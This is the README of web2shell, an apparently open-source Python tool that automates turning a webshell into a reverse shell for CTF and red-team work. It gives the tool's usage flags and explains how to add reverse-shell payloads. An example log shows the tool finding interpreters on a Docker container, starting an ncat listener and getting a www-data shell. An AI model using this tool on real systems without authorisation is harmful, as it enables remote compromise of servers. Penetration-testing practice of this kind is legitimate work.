# web2shell

A Python program used to automate converting webshells into reverse shells. If you regularly do CTF, HTB, or red teaming you've probably spent a good chunk of time testing payloads to convert a webshell into a reverse shell. This tool aims to simplify this process.

Credit for the reverse shells goes to [PayloadAllTheThings.](https://github.com/swisskyrepo/PayloadsAllTheThings)

## Usage

```
usage: web2shell [-h] [-i INTERFACE] [--force] [--ip IP] [--port PORT] [--nc NC] [--verbose] url

Automate converting webshells into reverse shells.

positional arguments:
  url                   webshell URL, replace the provided command with "SHELL". ex: https://example.com/shell.php?cmd=SHELL

options:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        the interface to use when listening for a remote shell. Default is localhost.
  --force               force command execution even if initial check is invalid
  --ip IP               IP address of your own listener (skips listener setup if both IP and port are set)
  --port PORT           port of your own listener
  --nc NC               path to local nc binary
  --verbose             verbose command output
```

Providing an IP and port will cause the program to skip the listener setup and assume you already have netcat/a comparable listener running at that address.

Please note: this program currently is only intended to be used on and against Linux machines.

## Requirements

Install the required python modules with pip (`pip3 install -r requirements.txt`.) You will need a local copy of `nc`. The program will attempt to find it automatically. If it can't (it might not be in your `$PATH`), please specify the path to the binary with the `--nc` flag.

## Adding New Payloads

The included payloads have all been tested on a simple webshell and work. If you'd like to add more, please feel free.

- Edit the `data/payloads.py` file.
- Add a new object to the `payloads` dict. The `key` should be the name of the bin, and the value should be a `list` object of payloads.
- Replace all instances of the reverse `IP` with `IPHERE`, the port with `PORTHERE`, and the binary name with `PATHHERE`. If the payload specifies the shell replace it with `SHELLHERE`.

## Example

Example execution on local Docker image (see `demo/README.md`)

```
[evan@ejedev web2shell]$ python3 web2shell.py -i docker0 http://127.0.0.1:8080/cmd.php?cmd=SHELL

               o                  o           o  o
               O     .oOOo.       O           O  O
               O          O       o           o  o
               o          o       O           O  O
'o     O .oOo. OoOo.     O' .oOo  OoOo. .oOo. o  o
 O  o  o OooO' O   o    O   `Ooo. o   o OooO' O  O
 o  O  O O     o   O  .O        O o   O O     o  o
 `Oo'oO' `OoO' `OoO' oOoOoO `OoO' O   o `OoO' Oo Oo
---------------------------------------------------
                      @ejedev

Verifying commands can be executed...
Available interfaces...
[-] lo
[-] enp4s0
[-] br-aa3534e13396
[-] br-c7551daa06d2
[-] docker0
[-] br-a193929c6ae4
[-] veth57bc03a
docker0 selected. Address to use is 172.17.0.1
Testing ports...
[x] 1025 already in use or unavailable.
[-] 1026 available!
Finding local nc binary...
nc target at /usr/bin/nc
Final connection string will be 172.17.0.1:1026...
Finding bins...
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1026
Ncat: Listening on 0.0.0.0:1026
[-] perl found at /usr/bin/perl
[-] perl found at /usr/bin/perl5.32-x86_64-linux-gnu
[-] php found at /usr/local/bin/php
[-] python found at /usr/bin/python3.9
[-] ruby found at /usr/bin/ruby2.7
[-] ruby found at /usr/bin/ruby
[-] go found at /usr/bin/go
Finding shells...
[-] bash found at /bin/bash
[-] sh found at /bin/sh
Executing reverse shell...
Bins to test: 7
Shells to test: 2
[!] Attempting perl payloads for path /usr/bin/perl
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:44590.
www-data@122099e5b76d:/var/www/html$
```
